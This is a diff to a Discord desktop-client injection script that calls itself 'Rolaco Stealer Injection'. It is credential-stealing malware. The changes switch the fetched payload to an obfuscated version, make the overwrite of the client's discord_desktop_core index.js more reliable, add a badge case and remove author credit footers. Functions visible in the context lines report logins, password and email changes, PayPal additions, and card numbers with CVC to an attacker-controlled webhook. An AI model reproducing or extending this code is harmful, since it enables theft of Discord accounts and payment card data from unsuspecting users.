@@ -6,18 +6,16 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK%', 
-  webhook_protector_key: '%WEBHOOK_KEY%', 
+  webhook: '%WEBHOOK%',
+  webhook_protector_key: '%WEBHOOK_KEY%',
   auto_buy_nitro: false, 
-  ping_on_run: true, 
-  ping_val: '@everyone',
+  ping_on_run: false, 
+  ping_val: '@everyone', 
   embed_name: 'Rolaco Stealer Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/Rolaco0/Rolacoim/main/mascot.png'.replace(/ /g, '%20'), 
-  embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Rolaco0/Discord-Injection-RG/main/injection-clean.js', 
-  /**
-   
-   **/
+  embed_icon: 'https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096', 
+  embed_color: 5639644, 
+  injection_url: 'https://raw.githubusercontent.com/Rolaco0/Discord-Injection-RG/main/injection-obfuscated.js', 
+
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
@@ -414,7 +412,8 @@ function updateCheck() {
   const appPath = path.join(resourcePath, 'app');
   const packageJson = path.join(appPath, 'package.json');
   const resourceIndex = path.join(appPath, 'index.js');
-  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
+  const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]
+  const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
   const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
   if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
   if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
@@ -589,6 +588,9 @@ const getBadges = (flags) => {
     case 131072:
       badges += 'Verified Bot Developer, ';
       break;
+    case 4194304:
+      badges += 'Active Developer, ';
+      break;
     case 4:
       badges += 'Hypesquad Event, ';
       break;
@@ -679,9 +681,6 @@ const login = async (email, password, token) => {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
-        footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
-        },
       },
     ],
   };
@@ -720,9 +719,6 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-        footer: {
-          text: '🎉・Discord Injection By Rolaco & https://discord.gg/cYmVd6eEm4',
         },
       },
     ],
@@ -763,9 +759,6 @@ const emailChanged = async (email, password, token) => {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
-        footer: {
-          text: '🎉・Discord Injection By Rolaco & https://discord.gg/cYmVd6eEm4',
-        },
       },
     ],
   };
@@ -805,9 +798,6 @@ const PaypalAdded = async (token) => {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
-        footer: {
-          text: '🎉・Discord Injection By Rolaco & https://discord.gg/cYmVd6eEm4',
-        },
       },
     ],
   };
@@ -846,9 +836,6 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-        footer: {
-          text: '🎉・Discord Injection By Rolaco & https://discord.gg/cYmVd6eEm4',
         },
       },
     ],
@@ -890,9 +877,6 @@ const nitroBought = async (token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-        footer: {
-          text: '🎉・Discord Injection By Rolaco & https://discord.gg/cYmVd6eEm4',
         },
       },
     ],
